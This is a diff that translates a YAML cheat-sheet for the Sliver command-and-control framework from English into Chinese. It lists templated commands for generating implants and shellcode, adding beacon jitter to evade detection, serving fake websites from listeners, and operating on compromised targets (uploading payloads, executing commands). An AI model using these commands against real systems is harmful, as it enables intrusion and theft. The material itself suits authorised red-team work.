@@ -6,1022 +6,1122 @@ actions:
   # GETTING STARTED
   # ============================================================================
   
-  - title: sliver - start server
+  - title: sliver - 启动服务器
     desc: |
-      Start the Sliver C2 server. The server manages implants, sessions, beacons,
-      and all C2 infrastructure. Run this on your C2 server host (preferably Linux/MacOS).
-      The server will generate certificates and keys automatically on first run.
+      启动 Sliver C2 服务器。服务器管理植入体、会话、信标以及所有 C2 基础设施。
+      在你的 C2 服务器主机上运行（最好是 Linux/MacOS）。
+      服务器会在首次运行时自动生成证书和密钥。
     command: "sliver-server"
 
-  - title: sliver - start client and connect
+  - title: sliver - 启动客户端并连接
     desc: |
-      Start the Sliver client and connect to a server. The client will prompt you
-      to select a server configuration if multiple configs are available. Client
-      connects to server via gRPC/mTLS on port 31337 by default.
+      启动 Sliver 客户端并连接到服务器。
+      如果有多个配置可用，客户端会提示你选择服务器配置。
+      客户端默认通过 31337 端口上的 gRPC/mTLS 连接到服务器。
     command: "sliver-client"
 
-  - title: sliver - show help
+  - title: sliver - 显示帮助
     desc: |
-      Display general help and list all available commands. Shows command categories
-      including generate, sessions, beacons, jobs, and more.
+      显示常规帮助并列出所有可用命令。
+      显示命令类别，包括 generate、sessions、beacons、jobs 等。
     command: "sliver > help"
 
-  - title: sliver - show command help
+  - title: sliver - 显示命令帮助
     desc: |
-      Display detailed help for a specific command. Shows all available flags,
-      arguments, and usage examples for the command.
+      显示特定命令的详细帮助。
+      显示该命令所有可用的标志、参数和使用示例。
     command: "sliver > {{command|generate}} --help"
 
-  - title: sliver - show version
+  - title: sliver - 显示版本
     desc: |
-      Display Sliver version information. Useful for checking installed version
-      or reporting issues.
+      显示 Sliver 版本信息。
+      用于检查已安装版本或报告问题。
     command: "sliver > version"
 
   # ============================================================================
   # IMPLANT GENERATION - BASIC
   # ============================================================================
 
-  - title: sliver - generate mTLS implant (session mode)
+  - title: sliver - 生成 mTLS 植入体（会话模式）
     desc: |
-      Generate a Sliver implant using Mutual TLS (mTLS) C2 in session mode.
-      Session mode provides real-time interactive communication. mTLS is the most
-      secure and recommended C2 protocol. The implant will connect to the specified
-      domain/IP on port 8888 by default.
+      使用 Mutual TLS（mTLS）C2 在会话模式下生成 Sliver 植入体。
+      会话模式提供实时交互式通信。mTLS 是最安全且推荐的 C2 协议。
+      植入体默认会连接到指定域名/IP 的 8888 端口。
     command: "sliver > generate --mtls {{domain|example.com}} --save {{output_dir|/tmp}}"
 
-  - title: sliver - generate mTLS implant (beacon mode)
+  - title: sliver - 生成 mTLS 植入体（信标模式）
     desc: |
-      Generate a Sliver implant using mTLS C2 in beacon mode. Beacon mode uses
-      asynchronous check-ins where the implant periodically polls for tasks.
-      More stealthy but less responsive than session mode. Default check-in is 60s.
+      使用 mTLS C2 在信标模式下生成 Sliver 植入体。
+      信标模式使用异步签到，植入体会定期轮询任务。
+      比会话模式更隐蔽但响应较慢。默认签到间隔为 60 秒。
     command: "sliver > generate --mtls {{domain|example.com}} --save {{output_dir|/tmp}} --beacon"
 
-  - title: sliver - generate HTTP implant
+  - title: sliver - 生成 HTTP 植入体
     desc: |
-      Generate a Sliver implant using HTTP(S) C2. The implant will attempt HTTPS
-      first, then fall back to HTTP if HTTPS fails. HTTP C2 supports proxy-aware
-      connections and can blend in with normal web traffic.
+      使用 HTTP(S) C2 生成 Sliver 植入体。
+      植入体会先尝试 HTTPS，如果失败则回退到 HTTP。
+      HTTP C2 支持代理感知连接，并能混入正常 Web 流量。
     command: "sliver > generate --http {{domain|example.com}} --save {{output_dir|/tmp}}"
 
-  - title: sliver - generate HTTPS implant
+  - title: sliver - 生成 HTTPS 植入体
     desc: |
-      Generate a Sliver implant using HTTPS C2. Requires SSL/TLS certificate
-      configuration. Can use Let's Encrypt for automatic certificate generation
-      or provide custom certificates.
+      使用 HTTPS C2 生成 Sliver 植入体。
+      需要 SSL/TLS 证书配置。
+      可以使用 Let's Encrypt 自动生成证书，或提供自定义证书。
     command: "sliver > generate --https {{domain|example.com}} --save {{output_dir|/tmp}}"
 
-  - title: sliver - generate DNS implant
+  - title: sliver - 生成 DNS 植入体
     desc: |
-      Generate a Sliver implant using DNS C2. Useful for highly restricted networks
-      where only DNS queries are allowed. Slower than other protocols but can bypass
-      network restrictions. Always use FQDN (with trailing dot) for DNS domains.
+      使用 DNS C2 生成 Sliver 植入体。
+      适用于只允许 DNS 查询的高度受限网络。
+      比其他协议慢，但能绕过网络限制。DNS 域名始终使用 FQDN（带末尾点）。
     command: "sliver > generate --dns {{fqdn|1.example.com.}} --save {{output_dir|/tmp}}"
 
-  - title: sliver - generate WireGuard implant
+  - title: sliver - 生成 WireGuard 植入体
     desc: |
-      Generate a Sliver implant using WireGuard C2. WireGuard provides fast, encrypted
-      VPN-like connectivity. Requires WireGuard listener setup and client configuration.
-      Best performance for port forwarding and SOCKS proxies.
+      使用 WireGuard C2 生成 Sliver 植入体。
+      WireGuard 提供快速、加密的类 VPN 连接。
+      需要设置 WireGuard 监听器和客户端配置。
+      在端口转发和 SOCKS 代理方面性能最佳。
     command: "sliver > generate --wg {{lhost|192.168.1.100}} --save {{output_dir|/tmp}}"
 
-  - title: sliver - generate for specific OS/arch
+  - title: sliver - 为特定操作系统/架构生成
     desc: |
-      Generate an implant for a specific operating system and architecture.
-      Sliver supports cross-compilation for Windows, Linux, and MacOS on multiple
-      architectures (amd64, 386, arm64, etc.). Use --os and --arch flags.
+      为特定操作系统和架构生成植入体。
+      Sliver 支持在多种架构（amd64、386、arm64 等）上为 Windows、Linux 和 MacOS 交叉编译。
+      使用 --os 和 --arch 标志。
     command: "sliver > generate --mtls {{domain|example.com}} --os {{os|windows}} --arch {{arch|amd64}} --save {{output_dir|/tmp}}"
 
-  - title: sliver - generate with multiple C2 endpoints
+  - title: sliver - 使用多个 C2 端点生成
     desc: |
-      Generate an implant with multiple C2 endpoints for redundancy. The implant
-      will try each endpoint in sequence (or randomly based on strategy). Useful for
-      failover scenarios or multi-domain setups.
+      使用多个 C2 端点生成植入体以实现冗余。
+      植入体会按顺序（或根据策略随机）尝试每个端点。
+      适用于故障转移场景或多域名部署。
     command: "sliver > generate --mtls {{domain1|example.com}} --http {{domain2|attacker.com}} --dns {{fqdn|1.example.com.}} --save {{output_dir|/tmp}}"
 
-  - title: sliver - generate with connection strategy
+  - title: sliver - 使用连接策略生成
     desc: |
-      Set the connection strategy for multiple endpoints. 's' = sequential (default,
-      tries in order), 'r' = random (randomly selects endpoint), 'rd' = random domain
-      (random domain but sequential protocol). Sequential is most performant.
+      为多个端点设置连接策略。
+      s 表示顺序（默认，按顺序尝试），r 表示随机（随机选择端点），rd 表示随机域名（随机域名但协议顺序）。
+      顺序方式性能最佳。
     command: "sliver > generate --mtls {{domain1|foo.com}} --mtls {{domain2|bar.com}} --strategy {{strategy|r}} --save {{output_dir|/tmp}}"
 
-  - title: sliver - generate with custom beacon interval
+  - title: sliver - 使用自定义信标间隔生成
     desc: |
-      Set custom beacon check-in interval for beacon mode implants. Default is 60s.
-      Lower intervals = faster response but more network traffic. Higher intervals
-      = more stealthy but slower task execution. Format: 30s, 5m, 1h, etc.
+      为信标模式植入体设置自定义信标签到间隔。默认为 60 秒。
+      间隔越小响应越快但网络流量更多。
+      间隔越大越隐蔽但任务执行越慢。格式：30s、5m、1h 等。
     command: "sliver > generate --mtls {{domain|example.com}} --beacon --seconds {{interval|30}} --save {{output_dir|/tmp}}"
 
-  - title: sliver - generate with jitter
+  - title: sliver - 使用抖动生成
     desc: |
-      Add random jitter to beacon check-in intervals. Jitter randomizes the check-in
-      time to avoid predictable patterns. Format: percentage (0-100) or duration.
-      Helps avoid detection by timing analysis.
+      为信标签到间隔添加随机抖动。
+      抖动会随机化签到时间以避免可预测的模式。
+      格式：百分比（0-100）或时长。
+      有助于避免通过时序分析被检测。
     command: "sliver > generate --mtls {{domain|example.com}} --beacon --jitter {{jitter|30}} --save {{output_dir|/tmp}}"
 
-  - title: sliver - generate with debug symbols
+  - title: sliver - 使用调试符号生成
     desc: |
-      Generate an implant with debug symbols enabled. Useful for troubleshooting
-      connection issues or development. Debug builds are larger and easier to detect.
-      Only use during testing, not in production engagements.
+      生成启用调试符号的植入体。
+      用于排查连接问题或开发。
+      调试构建体积更大且更易被检测。
+      仅在测试期间使用，不要用于生产行动。
     command: "sliver > generate --mtls {{domain|example.com}} --debug --save {{output_dir|/tmp}}"
 
-  - title: sliver - generate shellcode format
+  - title: sliver - 生成 shellcode 格式
     desc: |
-      Generate an implant in shellcode format instead of executable. Shellcode can
-      be injected into processes or used with stagers. Requires MinGW for Windows
-      shellcode generation. Format options: EXECUTABLE, SHARED_LIB, SHELLCODE.
+      以 shellcode 格式生成植入体，而不是可执行文件。
+      shellcode 可以注入到进程中或与 stager 配合使用。
+      Windows shellcode 生成需要 MinGW。格式选项：EXECUTABLE、SHARED_LIB、SHELLCODE。
     command: "sliver > generate --mtls {{domain|example.com}} --format {{format|shellcode}} --save {{output_dir|/tmp}}"
 
-  - title: sliver - generate DLL format
+  - title: sliver - 生成 DLL 格式
     desc: |
-      Generate an implant as a Windows DLL (shared library). DLLs can be loaded via
-      rundll32, regsvr32, or sideloaded into processes. Useful for evasion and
-      persistence techniques. Requires MinGW on the server.
+      将植入体生成为 Windows DLL（共享库）。
+      DLL 可以通过 rundll32、regsvr32 加载，或侧载到进程中。
+      用于规避和持久化技术。服务器上需要 MinGW。
     command: "sliver > generate --mtls {{domain|example.com}} --format {{format|shared}} --os windows --save {{output_dir|/tmp}}"
 
-  - title: sliver - generate with obfuscation disabled
+  - title: sliver - 禁用混淆生成
     desc: |
-      Generate an implant with symbol obfuscation disabled. Obfuscation makes static
-      analysis harder but increases compile time and memory usage. Disable for faster
-      builds or compatibility issues.
+      生成禁用符号混淆的植入体。
+      混淆会增加静态分析难度，但会增加编译时间和内存使用。
+      为了更快构建或兼容性问题，可禁用它。
     command: "sliver > generate --mtls {{domain|example.com}} --skip-symbols --save {{output_dir|/tmp}}"
 
-  - title: sliver - generate with canary domains
+  - title: sliver - 使用金丝雀域名生成
     desc: |
-      Add canary domains to the implant. Canary domains are unique per-binary domains
-      that are deliberately not obfuscated. If these domains are ever resolved (and you
-      have a DNS listener), you'll get an alert indicating the binary was discovered.
+      向植入体添加金丝雀域名。
+      金丝雀域名是每个二进制唯一的域名，故意不进行混淆。
+      如果这些域名被解析（且你设置了 DNS 监听器），你将收到告警，表明该二进制已被发现。
     command: "sliver > generate --mtls {{domain|example.com}} --canary {{canary|1.example.com.}} --save {{output_dir|/tmp}}"
 
-  - title: sliver - list generated implants
+  - title: sliver - 列出已生成的植入体
     desc: |
-      List all previously generated implants. Shows implant names (code names),
-      OS/architecture, debug status, format, and other metadata. Useful for tracking
-      which implants were generated and their configurations.
+      列出所有之前生成的植入体。
+      显示植入体名称（代号）、操作系统/架构、调试状态、格式和其他元数据。
+      用于跟踪已生成哪些植入体及其配置。
     command: "sliver > implants"
 
-  - title: sliver - regenerate existing implant
+  - title: sliver - 重新生成现有植入体
     desc: |
-      Regenerate a previously created implant using the same configuration. Useful
-      if you need to re-download an implant or regenerate with same settings.
-      Positional arguments (implant name) come after flags.
+      使用相同配置重新生成之前创建的植入体。
+      当你需要重新下载植入体或以相同设置重新生成时很有用。
+      位置参数（植入体名称）放在标志之后。
     command: "sliver > regenerate --save {{output_dir|/tmp}} {{implant_name|NEW_GRAPE}}"
 
   # ============================================================================
   # LISTENERS
   # ============================================================================
 
-  - title: sliver - start mTLS listener
+  - title: sliver - 启动 mTLS 监听器
     desc: |
-      Start an mTLS listener on the default port 8888. mTLS listeners accept connections
-      from implants generated with --mtls. The server automatically manages certificates.
-      Listeners run as background jobs and persist until stopped.
+      在默认端口 8888 上启动 mTLS 监听器。
+      mTLS 监听器接受使用 --mtls 生成的植入体的连接。
+      服务器自动管理证书。
+      监听器作为后台作业运行并持续到被停止。
     command: "sliver > mtls"
 
-  - title: sliver - start mTLS listener on custom port
+  - title: sliver - 在自定义端口启动 mTLS 监听器
     desc: |
-      Start an mTLS listener on a custom port. Useful when default port 8888 is blocked
-      or you need multiple listeners. Ensure firewall rules allow the port.
+      在自定义端口上启动 mTLS 监听器。
+      当默认端口 8888 被阻止或你需要多个监听器时很有用。
+      确保防火墙规则允许该端口。
     command: "sliver > mtls --lhost {{ip|0.0.0.0}} --lport {{port|9999}}"
 
-  - title: sliver - start HTTP listener
+  - title: sliver - 启动 HTTP 监听器
     desc: |
-      Start an HTTP listener on port 80. HTTP listeners accept connections from implants
-      generated with --http. The listener responds to any domain by default. Can be
-      restricted to specific domains using --domain flag.
+      在 80 端口上启动 HTTP 监听器。
+      HTTP 监听器接受使用 --http 生成的植入体的连接。
+      监听器默认响应任何域名。
+      可以使用 --domain 标志限制到特定域名。
     command: "sliver > http"
 
-  - title: sliver - start HTTP listener with domain restriction
+  - title: sliver - 使用域名限制启动 HTTP 监听器
     desc: |
-      Start an HTTP listener restricted to a specific domain. Only responds to requests
-      with the specified Host header. Useful for multi-domain setups or when using
-      redirectors. Each listener can only accept one domain.
+      启动限制到特定域名的 HTTP 监听器。
+      只响应具有指定 Host 头的请求。
+      适用于多域名部署或使用重定向器时。
+      每个监听器只能接受一个域名。
     command: "sliver > http --domain {{domain|example.com}}"
 
-  - title: sliver - start HTTP listener with static website
+  - title: sliver - 使用静态网站启动 HTTP 监听器
     desc: |
-      Start an HTTP listener with static website content. Makes the server look legitimate
-      by serving fake content (e.g., default IIS page). Website content is managed via
-      the 'websites' command. Useful for blending in with normal web traffic.
+      使用静态网站内容启动 HTTP 监听器。
+      通过提供虚假内容（例如默认 IIS 页面）使服务器看起来合法。
+      网站内容通过 websites 命令管理。
+      用于混入正常 Web 流量。
     command: "sliver > http --domain {{domain|example.com}} --website {{website_name|fake-blog}}"
 
-  - title: sliver - start HTTPS listener
+  - title: sliver - 启动 HTTPS 监听器
     desc: |
-      Start an HTTPS listener on port 443. HTTPS listeners require SSL/TLS certificates.
-      By default uses self-signed certificates. Can use Let's Encrypt for automatic
-      certificates or provide custom cert/key pairs.
+      在 443 端口上启动 HTTPS 监听器。
+      HTTPS 监听器需要 SSL/TLS 证书。
+      默认使用自签名证书。
+      可以使用 Let's Encrypt 自动生成证书，或提供自定义证书/密钥对。
     command: "sliver > https --domain {{domain|example.com}}"
 
-  - title: sliver - start HTTPS listener with Let's Encrypt
+  - title: "sliver - 使用 Let's Encrypt 启动 HTTPS 监听器"
     desc: |
-      Start an HTTPS listener with automatic Let's Encrypt certificate generation.
-      Requires public DNS pointing to the server and ability to bind to port 80/443.
-      Certificates are automatically renewed. Best for production C2 infrastructure.
+      使用 Let's Encrypt 自动生成证书启动 HTTPS 监听器。
+      需要指向服务器的公共 DNS 以及绑定到 80/443 端口的能力。
+      证书会自动续期。最适合生产 C2 基础设施。
     command: "sliver > https --domain {{domain|example.com}} --lets-encrypt"
 
-  - title: sliver - start HTTPS listener with custom certificate
+  - title: sliver - 使用自定义证书启动 HTTPS 监听器
     desc: |
-      Start an HTTPS listener with custom SSL/TLS certificate and key. Provide paths
-      to PEM-encoded certificate and private key files. Useful when you have your own
-      certificates or need specific certificate properties.
+      使用自定义 SSL/TLS 证书和密钥启动 HTTPS 监听器。
+      提供 PEM 编码的证书和私钥文件路径。
+      当你拥有自己的证书或需要特定证书属性时很有用。
     command: "sliver > https --domain {{domain|example.com}} --cert {{cert_path|./cert.pem}} --key {{key_path|./key.pem}}"
 
-  - title: sliver - start DNS listener
+  - title: sliver - 启动 DNS 监听器
     desc: |
-      Start a DNS listener for DNS C2. Requires proper DNS configuration (A records,
-      NS records) pointing to the server. Always use FQDN (with trailing dot) when
-      specifying domains. Listener binds to UDP port 53.
+      为 DNS C2 启动 DNS 监听器。
+      需要正确的 DNS 配置（A 记录、NS 记录）指向服务器。
+      指定域名时始终使用 FQDN（带末尾点）。
+      监听器绑定到 UDP 53 端口。
     command: "sliver > dns --domains {{fqdn|1.example.com.}}"
 
-  - title: sliver - start DNS listener with multiple domains
+  - title: sliver - 使用多个域名启动 DNS 监听器
     desc: |
-      Start a DNS listener for multiple parent domains. Useful when managing multiple
-      DNS C2 domains or subdomains. Each domain must be properly configured in DNS.
+      为多个父域名启动 DNS 监听器。
+      在管理多个 DNS C2 域名或子域名时很有用。
+      每个域名都必须在 DNS 中正确配置。
     command: "sliver > dns --domains {{fqdn1|1.example.com.}} {{fqdn2|2.example.com.}}"
 
-  - title: sliver - start WireGuard listener
+  - title: sliver - 启动 WireGuard 监听器
     desc: |
-      Start a WireGuard listener for WireGuard C2. WireGuard provides fast, encrypted
-      VPN-like connectivity. Default port is UDP 53. Requires client configuration
-      setup using 'wg-config' command. Best for port forwarding and SOCKS proxies.
+      为 WireGuard C2 启动 WireGuard 监听器。
+      WireGuard 提供快速、加密的类 VPN 连接。
+      默认端口为 UDP 53。
+      需要使用 wg-config 命令设置客户端配置。
+      在端口转发和 SOCKS 代理方面性能最佳。
     command: "sliver > wg"
 
-  - title: sliver - start WireGuard listener on custom port
+  - title: sliver - 在自定义端口启动 WireGuard 监听器
     desc: |
-      Start a WireGuard listener on a custom UDP port. Useful when port 53 is blocked
-      or you need multiple WireGuard listeners. Ensure firewall allows the port.
+      在自定义 UDP 端口上启动 WireGuard 监听器。
+      当 53 端口被阻止或你需要多个 WireGuard 监听器时很有用。
+      确保防火墙允许该端口。
     command: "sliver > wg --lport {{port|51820}}"
 
-  - title: sliver - list active jobs/listeners
+  - title: sliver - 列出活动作业/监听器
     desc: |
-      List all active background jobs including listeners. Shows job ID, name, protocol,
-      and port. Jobs persist until explicitly stopped. Use job IDs to manage listeners.
+      列出所有活动的后台作业，包括监听器。
+      显示作业 ID、名称、协议和端口。
+      作业会持续到被显式停止。
+      使用作业 ID 来管理监听器。
     command: "sliver > jobs"
 
-  - title: sliver - stop a job/listener
+  - title: sliver - 停止作业/监听器
     desc: |
-      Stop a specific background job by ID. Use 'jobs' command to see active job IDs.
-      Stopping a listener will prevent new implants from connecting but won't affect
-      existing sessions/beacons.
+      按 ID 停止特定的后台作业。
+      使用 jobs 命令查看活动作业 ID。
+      停止监听器会阻止新植入体连接，但不会影响现有会话/信标。
     command: "sliver > jobs --kill {{job_id|1}}"
 
   # ============================================================================
   # SESSIONS & BEACONS
   # ============================================================================
 
-  - title: sliver - list active sessions
+  - title: sliver - 列出活动会话
     desc: |
-      List all active interactive sessions. Sessions provide real-time bidirectional
-      communication. Shows session ID, name, transport, remote address, hostname,
-      username, OS, last check-in, and health status.
+      列出所有活动的交互式会话。
+      会话提供实时双向通信。
+      显示会话 ID、名称、传输方式、远程地址、主机名、用户名、操作系统、上次签到和健康状态。
     command: "sliver > sessions"
 
-  - title: sliver - list active beacons
+  - title: sliver - 列出活动信标
     desc: |
-      List all active beacons. Beacons use asynchronous check-ins. Shows beacon ID,
-      name, task queue, transport, remote address, hostname, username, OS, last check-in,
-      and next check-in time (with jitter).
+      列出所有活动的信标。
+      信标使用异步签到。
+      显示信标 ID、名称、任务队列、传输方式、远程地址、主机名、用户名、操作系统、上次签到和下次签到时间（含抖动）。
     command: "sliver > beacons"
 
-  - title: sliver - watch beacons in real-time
+  - title: sliver - 实时监视信标
     desc: |
-      Watch beacons in real-time. Continuously displays beacon check-ins and status
-      updates. Useful for monitoring beacon activity. Press Ctrl+C to stop watching.
+      实时监视信标。
+      持续显示信标签到和状态更新。
+      用于监控信标活动。按 Ctrl+C 停止监视。
     command: "sliver > beacons watch"
 
-  - title: sliver - interact with session
+  - title: sliver - 与会话交互
     desc: |
-      Interact with a specific session. Use session ID (full or prefix) or session name.
-      Tab completion is available for session identifiers. After interaction, prompt
-      changes to show active session name. Use 'background' to return to main prompt.
+      与特定会话交互。
+      使用会话 ID（完整或前缀）或会话名称。
+      会话标识符支持 Tab 补全。
+      交互后提示符会变为显示活动会话名称。使用 background 返回主提示符。
     command: "sliver > use {{session_id|8ff2ce4c}}"
 
-  - title: sliver - interact with beacon
+  - title: sliver - 与信标交互
     desc: |
-      Interact with a specific beacon. Use beacon ID (full or prefix) or beacon name.
-      Tab completion is available for beacon identifiers. Beacon prompt is blue (vs
-      red for sessions). Commands execute asynchronously and return results on next check-in.
+      与特定信标交互。
+      使用信标 ID（完整或前缀）或信标名称。
+      信标标识符支持 Tab 补全。
+      信标提示符为蓝色（会话为红色）。
+      命令异步执行并在下次签到时返回结果。
     command: "sliver > use {{beacon_id|8c465643}}"
 
-  - title: sliver - switch beacon to interactive session
+  - title: sliver - 将信标切换为交互式会话
     desc: |
-      Task a beacon to open an interactive session. The beacon will establish a real-time
-      connection over its active C2 protocol. Can only use protocols compiled into the
-      implant. Use 'close' command to close the session without killing the beacon.
+      让信标打开交互式会话。
+      信标会通过其活动的 C2 协议建立实时连接。
+      只能使用编译进植入体的协议。
+      使用 close 命令关闭会话而不终止信标。
     command: "sliver (BEACON_NAME) > interactive"
 
-  - title: sliver - switch beacon to interactive session with alternative endpoint
+  - title: sliver - 使用备用端点将信标切换为交互式会话
     desc: |
-      Task a beacon to open an interactive session using an alternative endpoint.
-      Useful when you want to use a different domain or redirector. The endpoint must
-      use a protocol that was compiled into the implant.
+      让信标使用备用端点打开交互式会话。
+      当你希望使用不同域名或重定向器时很有用。
+      端点必须使用编译进植入体的协议。
     command: "sliver (BEACON_NAME) > interactive --mtls {{endpoint|redirector.example.com:8888}}"
 
-  - title: sliver - close interactive session
+  - title: sliver - 关闭交互式会话
     desc: |
-      Close an interactive session opened from a beacon. The beacon will continue
-      performing check-ins while the session is open. Closing the session returns
-      the beacon to asynchronous mode without killing the implant.
+      关闭从信标打开的交互式会话。
+      会话打开期间信标会继续签到。
+      关闭会话可使信标返回异步模式而不会终止植入体。
     command: "sliver (BEACON_NAME) > close"
 
-  - title: sliver - background current session/beacon
+  - title: sliver - 将当前会话/信标置入后台
     desc: |
-      Return to main prompt without disconnecting from the current session/beacon.
-      The session/beacon remains active and you can interact with it again later.
-      Useful for managing multiple sessions simultaneously.
+      返回主提示符而不断开当前会话/信标的连接。
+      会话/信标保持活动，你以后可以再次与之交互。
+      用于同时管理多个会话。
     command: "sliver (SESSION_NAME) > background"
 
-  - title: sliver - view beacon tasks
+  - title: sliver - 查看信标任务
     desc: |
-      View all tasks executed by the active beacon. Shows task ID, state, message type,
-      created time, sent time, and completed time. Tasks execute in FIFO order. Use
-      'tasks fetch' to retrieve output from specific tasks.
+      查看活动信标执行的所有任务。
+      显示任务 ID、状态、消息类型、创建时间、发送时间和完成时间。
+      任务按 FIFO 顺序执行。
+      使用 tasks fetch 获取特定任务的输出。
     command: "sliver (BEACON_NAME) > tasks"
 
-  - title: sliver - fetch task output
+  - title: sliver - 获取任务输出
     desc: |
-      Fetch output from a specific completed task. Presents interactive menu to select
-      task. Useful for retrieving results from long-running tasks or tasks executed by
-      other operators in multiplayer mode.
+      从特定已完成任务获取输出。
+      呈现交互式菜单以选择任务。
+      用于获取长时间运行任务的输出，或多人模式下其他操作员执行的任务的结果。
     command: "sliver (BEACON_NAME) > tasks fetch"
 
   # ============================================================================
   # FILE OPERATIONS
   # ============================================================================
 
-  - title: sliver - list directory contents
+  - title: sliver - 列出目录内容
     desc: |
-      List files and directories in the current working directory on the target.
-      Shows file names, sizes, permissions, and modification times. Similar to 'ls'
-      or 'dir' commands.
+      列出目标当前工作目录中的文件和目录。
+      显示文件名、大小、权限和修改时间。
+      类似于 ls 或 dir 命令。
     command: "sliver (SESSION_NAME) > ls"
 
-  - title: sliver - list directory with path
+  - title: sliver - 列出指定路径目录
     desc: |
-      List files and directories in a specific path. Can use absolute or relative
-      paths. Works on both Windows and Unix-like systems.
+      列出特定路径中的文件和目录。
+      可以使用绝对或相对路径。
+      在 Windows 和类 Unix 系统上都能工作。
     command: "sliver (SESSION_NAME) > ls {{path|C:\\Users}}"
 
-  - title: sliver - change directory
+  - title: sliver - 更改目录
     desc: |
-      Change the current working directory on the target. Use absolute or relative
-      paths. Changes directory context for subsequent file operations.
+      更改目标上的当前工作目录。
+      使用绝对或相对路径。
+      为后续文件操作更改目录上下文。
     command: "sliver (SESSION_NAME) > cd {{path|C:\\Users\\Public}}"
 
-  - title: sliver - print working directory
+  - title: sliver - 打印工作目录
     desc: |
-      Print the current working directory on the target. Shows full path to current
-      directory. Useful for orientation and scripting.
+      打印目标上的当前工作目录。
+      显示当前目录的完整路径。
+      用于定位和编写脚本。
     command: "sliver (SESSION_NAME) > pwd"
 
-  - title: sliver - display file contents
+  - title: sliver - 显示文件内容
     desc: |
-      Display the contents of a file on the target. Reads and displays file content
-      to console. Useful for reading configuration files, logs, or small text files.
+      显示目标上文件的内容。
+      读取文件内容并显示到控制台。
+      用于读取配置文件、日志或小文本文件。
     command: "sliver (SESSION_NAME) > cat {{file_path|C:\\Windows\\System32\\drivers\\etc\\hosts}}"
 
-  - title: sliver - download file from target
+  - title: sliver - 从目标下载文件
     desc: |
-      Download a file from the target to the local machine. File is saved to the
-      current working directory or specified path. Shows download progress and file size.
+      将文件从目标下载到本地机器。
+      文件保存到当前工作目录或指定路径。
+      显示下载进度和文件大小。
     command: "sliver (SESSION_NAME) > download {{remote_path|C:\\Users\\Desktop\\file.txt}}"
 
-  - title: sliver - download file to specific path
+  - title: sliver - 下载文件到特定路径
     desc: |
-      Download a file from the target to a specific local path. Useful for organizing
-      downloaded files or saving to a specific location. Creates directories if needed.
+      将文件从目标下载到特定本地路径。
+      用于整理下载的文件或保存到特定位置。
+      需要时会创建目录。
     command: "sliver (SESSION_NAME) > download {{remote_path|C:\\Users\\Desktop\\file.txt}} --save {{local_path|/tmp/file.txt}}"
 
-  - title: sliver - upload file to target
+  - title: sliver - 上传文件到目标
     desc: |
-      Upload a file from the local machine to the target. File is uploaded to the
-      current working directory on the target or specified path. Shows upload progress.
+      将文件从本地机器上传到目标。
+      文件上传到目标当前工作目录或指定路径。
+      显示上传进度。
     command: "sliver (SESSION_NAME) > upload {{local_path|/tmp/payload.exe}}"
 
-  - title: sliver - upload file to specific path
+  - title: sliver - 上传文件到特定路径
     desc: |
-      Upload a file to a specific path on the target. Useful for placing files in
-      specific locations. Creates directories if needed. Can overwrite existing files.
+      将文件上传到目标上的特定路径。
+      用于将文件放置到特定位置。
+      需要时会创建目录。可以覆盖现有文件。
     command: "sliver (SESSION_NAME) > upload {{local_path|/tmp/payload.exe}} --save {{remote_path|C:\\Users\\Public\\payload.exe}}"
 
-  - title: sliver - create directory
+  - title: sliver - 创建目录
     desc: |
-      Create a new directory on the target. Creates single directory or full path
-      (with --p flag). Useful for organizing files or creating staging directories.
+      在目标上创建新目录。
+      创建单个目录或完整路径（使用 --p 标志）。
+      用于整理文件或创建暂存目录。
     command: "sliver (SESSION_NAME) > mkdir {{path|C:\\Temp\\Staging}}"
 
-  - title: sliver - create directory tree
+  - title: sliver - 创建目录树
     desc: |
-      Create a directory tree (parent directories). Automatically creates all
-      necessary parent directories if they don't exist. Useful for creating nested
-      directory structures.
+      创建目录树（父目录）。
+      自动创建所有不存在的必要父目录。
+      用于创建嵌套目录结构。
     command: "sliver (SESSION_NAME) > mkdir --p {{path|C:\\Temp\\Staging\\Subdir}}"
 
-  - title: sliver - remove file
+  - title: sliver - 删除文件
     desc: |
-      Delete a file on the target. Permanently removes the file. Use with caution.
-      Cannot delete directories (use 'rmdir' for directories).
+      删除目标上的文件。
+      永久删除文件。请谨慎使用。
+      不能删除目录（删除目录使用 rmdir）。
     command: "sliver (SESSION_NAME) > rm {{file_path|C:\\Temp\\file.txt}}"
 
-  - title: sliver - remove directory
+  - title: sliver - 删除目录
     desc: |
-      Remove an empty directory on the target. Directory must be empty. Use 'rm -r'
-      to remove directories with contents (recursive).
+      删除目标上的空目录。
+      目录必须为空。
+      使用 rm -r 递归删除含内容的目录。
     command: "sliver (SESSION_NAME) > rmdir {{path|C:\\Temp\\EmptyDir}}"
 
-  - title: sliver - remove directory recursively
+  - title: sliver - 递归删除目录
     desc: |
-      Remove a directory and all its contents recursively. Deletes directory tree
-      including all files and subdirectories. Use with extreme caution.
+      递归删除目录及其所有内容。
+      删除包括所有文件和子目录在内的目录树。
+      请极其谨慎使用。
     command: "sliver (SESSION_NAME) > rm -r {{path|C:\\Temp\\Staging}}"
 
-  - title: sliver - move/rename file
+  - title: sliver - 移动/重命名文件
     desc: |
-      Move or rename a file on the target. Can move files to different directories
-      or rename them. Preserves file contents and metadata.
+      在目标上移动或重命名文件。
+      可以将文件移动到不同目录或重命名。
+      保留文件内容和元数据。
     command: "sliver (SESSION_NAME) > mv {{source|C:\\Temp\\old.txt}} {{dest|C:\\Temp\\new.txt}}"
 
-  - title: sliver - copy file
+  - title: sliver - 复制文件
     desc: |
-      Copy a file on the target. Creates a duplicate of the file at the destination.
-      Original file remains unchanged. Useful for backups or creating multiple copies.
+      在目标上复制文件。
+      在目标位置创建文件的副本。
+      原文件保持不变。
+      用于备份或创建多个副本。
     command: "sliver (SESSION_NAME) > cp {{source|C:\\Temp\\file.txt}} {{dest|C:\\Temp\\backup.txt}}"
 
   # ============================================================================
   # PROCESS OPERATIONS
   # ============================================================================
 
-  - title: sliver - list processes
+  - title: sliver - 列出进程
     desc: |
-      List running processes on the target. Shows PID, PPID, name, user, architecture,
-      and other process information. Similar to 'ps' or 'tasklist' commands.
+      列出目标上正在运行的进程。
+      显示 PID、PPID、名称、用户、架构和其他进程信息。
+      类似于 ps 或 tasklist 命令。
     command: "sliver (SESSION_NAME) > ps"
 
-  - title: sliver - execute command
+  - title: sliver - 执行命令
     desc: |
-      Execute a command on the target and return output. Runs command in a new process
-      and captures stdout/stderr. Output is displayed when command completes.
+      在目标上执行命令并返回输出。
+      在新进程中运行命令并捕获 stdout/stderr。
+      命令完成后显示输出。
